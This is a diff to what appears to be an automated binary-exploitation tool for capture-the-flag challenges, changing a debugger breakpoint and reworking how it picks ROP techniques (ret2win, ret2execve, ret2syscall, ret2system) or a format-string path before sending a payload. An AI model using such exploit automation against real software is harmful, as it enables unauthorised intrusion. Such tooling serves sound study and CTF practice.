@@ -24,7 +24,7 @@ MM88MMM ,adPPYYba, 8b,dPPYba, MM88MMM
 fire = "\U0001F525"
 
 gs = '''
-b main
+b vuln
 continue
 '''
 context.terminal = ["tmux", "splitw", "-h"]
@@ -87,7 +87,7 @@ def check_vuln_type(binary):
     else:
         properties["syscall"] = False
 
-    if binary.has_format():
+    if binary.has_leak():
         print("[+] Possible format string bug")
         properties["format"] = True
     else:
@@ -112,15 +112,21 @@ def exploit(analyize, properties):
     p = start(binary)
     payload = None
     
-    rop = Fart_ROP.ROP(analyze, properties)
-    if properties["win"]:
+    if properties["rop"]:
+        rop = Fart_ROP.ROP(analyze, properties)
+    elif properties["format"]:
+        fmt = Fart_FMT.FMT(analyze, properties)
+
+    if properties["win"] and properties["rop"]:
         payload = rop.ret2win()
-    elif properties["execve"]:
+    elif properties["execve"] and properties["rop"]:
         payload = rop.ret2execve()
-    elif properties["syscall"]:
+    elif properties["syscall"] and properties["rop"]:
         payload = rop.ret2syscall()
-    elif properties["system"]:
+    elif properties["system"] and properties["rop"]:
         payload = rop.ret2system()
+    elif properties["format"] and properties["printf"]:
+        print(analyze.has_leak())
 
     if payload:
         p.sendline(payload)
